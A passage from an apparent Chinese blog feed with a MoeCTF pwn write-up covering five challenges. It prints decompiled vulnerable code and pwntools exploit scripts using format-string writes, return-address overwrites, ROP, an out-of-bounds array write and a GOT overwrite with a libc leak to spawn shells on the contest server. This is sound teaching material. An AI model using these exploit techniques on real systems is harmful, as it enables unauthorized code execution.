class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序先产生一个随机数, 保存在<code>dword_804C044</code>全局变量里. 所以我们尝试使用<code>printf</code>的漏洞向<code>dword_804C044</code>写数据. (<code>%n</code>可以向一个地址写已打印的字符数).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./babyfmt&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9503</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%12$n\0\0\0&#x27;</span> + p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{fmt_1s_soooo_e@sy}</p></blockquote><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>先看<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+16h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>s</code>大小仅为10, 但是最多可输入256个字符, 可以利用这个修改返回地址, 在函数<code>return 0;</code>的时候跳到另一个地方.<br>发现有一个函数<code>backdoor</code>里面有<code>&quot;/bin/sh&quot;</code>, 切汇编看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400687 ; int backdoor()</span><br><span class="line">.text:0000000000400687                 public backdoor</span><br><span class="line">.text:0000000000400687 backdoor        proc near</span><br><span class="line">.text:0000000000400687 ; __unwind &#123;</span><br><span class="line">.text:0000000000400687                 push    rbp</span><br><span class="line">.text:0000000000400688                 mov     rbp, rsp</span><br><span class="line">.text:000000000040068B                 lea     rdi, command    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000400692                 call    _system</span><br><span class="line">.text:0000000000400697                 nop</span><br><span class="line">.text:0000000000400698                 pop     rbp</span><br><span class="line">.text:0000000000400699                 retn</span><br><span class="line">.text:0000000000400699 ; &#125; // starts at 400687</span><br><span class="line">.text:0000000000400699 backdoor        endp</span><br></pre></td></tr></table></figure><p><code>0x40068B</code>这里把字符串放入rdi(第一个参数), 然后调用<code>system</code>函数, 那就跳到这吧.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9502</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;*&#x27;</span>*(<span class="number">10</span>+<span class="number">8</span>)+p64(<span class="number">0x40068B</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{ret2txt_tr4v3l2she11}</p></blockquote><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>通过<code>main</code>找到<code>vuln</code>函数有栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后<code>backdoor</code>里有调用<code>system</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:080484F6 ; int backdoor()</span><br><span class="line">.text:080484F6                 public backdoor</span><br><span class="line">.text:080484F6 backdoor        proc near</span><br><span class="line">.text:080484F6</span><br><span class="line">.text:080484F6 var_4           = dword ptr -4</span><br><span class="line">.text:080484F6</span><br><span class="line">.text:080484F6 ; __unwind &#123;</span><br><span class="line">.text:080484F6                 push    ebp</span><br><span class="line">.text:080484F7                 mov     ebp, esp</span><br><span class="line">.text:080484F9                 push    ebx</span><br><span class="line">.text:080484FA                 sub     esp, 4</span><br><span class="line">.text:080484FD                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048502                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08048507                 sub     esp, 0Ch</span><br><span class="line">.text:0804850A                 lea     edx, (aXiaoHaiZiCaiZu - 804A000h)[eax] ; &quot;xiao hai zi cai zuo xuan ze,da ren wo q&quot;...</span><br><span class="line">.text:08048510                 push    edx             ; command</span><br><span class="line">.text:08048511                 mov     ebx, eax</span><br><span class="line">.text:08048513                 call    _system</span><br><span class="line">.text:08048518                 add     esp, 10h</span><br><span class="line">.text:0804851B                 nop</span><br><span class="line">.text:0804851C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:0804851F                 leave</span><br><span class="line">.text:08048520                 retn</span><br><span class="line">.text:08048520 ; &#125; // starts at 80484F6</span><br><span class="line">.text:08048520 backdoor        endp</span><br></pre></td></tr></table></figure><p>但是参数并不是<code>/bin/sh</code>, 所以我们要想办法让栈顶存放的指针指向这个字符串, 然后再跳到这执行<code>system</code>.<br>按ctrl+S打开节表, 发现0x804A028处有可读写空间, 我们可以先想办法把<code>&quot;/bin/sh&quot;</code>写到这里.</p><p>可以通过溢出构造这样一个栈帧:</p><p><em>高地址</em></p><p><table style="width: fit-content;">    <tr><td>缓冲区地址</td></tr>    <tr><td>system函数的调用处</td></tr>    <tr><td>gets函数的开头(或者jmp _gets)</td></tr></table><br><em>低地址</em></p><p>程序执行到<code>ret</code>指令时, 会让函数返回到0x08048380处(<code>jmp _gets</code>), 然后程序以0x804A028(放置<code>&quot;/bin/sh&quot;</code>的缓冲区)作为第一个参数调用<code>gets</code>, 这时我们输入<code>&quot;/bin/sh&quot;</code>, <code>gets</code>返回到0x8048513, 也就是直接调用<code>system</code>, 此时的栈顶正好是这个缓冲区.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9504</span>)</span><br><span class="line">addr_text = <span class="number">0x804A028</span></span><br><span class="line">addr_gets = <span class="number">0x8048380</span></span><br><span class="line">addr_system = <span class="number">0x8048513</span></span><br><span class="line">v = <span class="string">b&#x27;*&#x27;</span>*(<span class="number">0x24</span>+<span class="number">4</span>*<span class="number">2</span>)+p32(addr_gets)+p32(addr_system)+p32(addr_text)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">p.sendline(v)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{do_you_l1k3_vtuber_too?}</p></blockquote><h3 id="Int-overflow-revenge"><a href="#Int-overflow-revenge" class="headerlink" title="Int_overflow_revenge"></a>Int_overflow_revenge</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-10h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-8h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">2</span>] = (<span class="keyword">int</span>)&amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang comes and would like to buy watermelon.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang: how much per jin?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v7, v4, v5, v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You: %d yi jin\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">0</span>] &gt; <span class="number">1u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang: Wt&#x27;sup&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang: gua pi zi gold, gua li zi gold&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang becomes angry, killing the boss and leaving.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang: choose one.&quot;</span>);</span><br><span class="line">  v3 = sell_watermelon();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d jin, %d\n&quot;</span>, v3 * v7[<span class="number">0</span>], v3 * v7[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang: XiTieShi!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HuaQiang becomes angry, killing the boss and leaving.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看17行, 如果输入的值大于1, 游戏结束. 所以第一个输入应该是不大于1的整数.<br>然后就可以<code>sell_watermelon</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sell_watermelon</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp-8h] [ebp-220h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp-8h] [ebp-220h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp-4h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-4h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+0h] [ebp-218h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+0h] [ebp-218h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+8h] [ebp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// [esp+Fh] [ebp-209h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">130</span>]; <span class="comment">// [esp+10h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;128 watermelons there, choose one and input the index: &quot;</span>);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%hhd&quot;</span>, &amp;v8, v1, v3, v5);</span><br><span class="line">    <span class="keyword">if</span> ( check((<span class="keyword">char</span>)v8, <span class="number">128</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;not so much&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;128 watermelons there, choose one and input the index: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Confirm the weight&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The real weight is 13 * 500g, (15 with XiTieShi)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Change the weight?(1 for yes)&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7, v1, v3, v5);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the weight to change: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v9[v8], v2, v4, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9[(<span class="keyword">char</span>)v8] = <span class="number">15</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9[v8];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以利用整数溢出写数组之外的值, 我们可以修改返回地址到0x08049246, 那里会调用<code>system(&quot;/bin/sh&quot;)</code><br>返回地址应该是<code>[ebp+0x4]</code>, 数组起始地址是<code>ebp-0x208</code>, (0x208+4)/4=131, 那就输入131.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./intoverflow&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9508</span>)</span><br><span class="line">addr_shl = <span class="number">0x8049246</span></span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;131&#x27;</span>)</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(addr_shl), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{the_watermelon_is_permitted_to_be_grown_up}</p></blockquote><h3 id="Human’s-Nature"><a href="#Human’s-Nature" class="headerlink" title="Human’s Nature"></a>Human’s Nature</h3><p>查看<code>main</code>调用的<code>vuln</code>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s human&#x27;s nature???&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s human&#x27;s nature???\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">    s[(<span class="keyword">int</span>)read(<span class="number">0</span>, s, <span class="number">0x7F</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_20B6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是个死循环, 所以修改返回地址没用, 但是我们可以通过<code>printf</code>漏洞修改got中指向<code>printf</code>的值, 让它变成指向<code>system</code>的值, 如果我们在前面<code>read</code>函数被调用时输入了<code>&quot;/bin/sh&quot;</code>, 那么我们的目的就达到了.</p><p>程序开启了地址随机化, 所以我们要先得到任意一处代码在内存中的位置, 再减去不开启随机化时的位置, 就可以求出偏移, 这里我们选择<code>vuln</code>的返回地址0x555A28555303.</p><p>下一步我们获取<code>printf</code>函数的地址, 然后我们可以通过题目中给出的libc.so求得<code>system</code>的地址.</p><p>然后就可以修改got中的<code>printf</code>啦, 那天在网上找到pwn中有个函数<code>fmtstr_payload</code>可以直接构造格式串, 新技能get.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">p, addr</span>):</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;%9$s\0\0\0\0&#x27;</span> + p64(addr + <span class="number">7</span> - i))</span><br><span class="line">tt = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tt) &gt; <span class="number">1</span>:</span><br><span class="line">n = (n &lt;&lt; <span class="number">8</span>) | tt[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n = n &lt;&lt; <span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hijack&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9505</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&quot;???\nWhat&#x27;s human&#x27;s nature???\n&quot;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;%23$p&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">reloc = <span class="built_in">eval</span>(p.recvline()) - <span class="number">0x555A28555303</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;* Get reloc &#x27;</span> + <span class="built_in">hex</span>(reloc))</span><br><span class="line">p_printf = reloc + <span class="number">0x555A28558020</span></span><br><span class="line">p.recvline()</span><br><span class="line">f_printf = get_data(p, p_printf)</span><br><span class="line">of_system = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">of_system = <span class="number">0x48E50</span> - <span class="number">0x56CF0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">of_system = <span class="number">0x4F550</span> - <span class="number">0x64F70</span></span><br><span class="line">f_system = f_printf + of_system</span><br><span class="line">wr = fmtstr_payload(<span class="number">8</span>, &#123;p_printf:f_system&#125;)</span><br><span class="line">p.sendline(wr)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{hIj4ck_Is_@_gr34t_w4y_t0_g3t_sh311}</p></blockquote><h1 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h1><p>星期八更新</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C中的qsort真的比C++中的std::sort快吗?</title>
      <link href="/2021/09/20/test-sort/"/>
      <url>/2021/09/20/test-sort/</url>
      
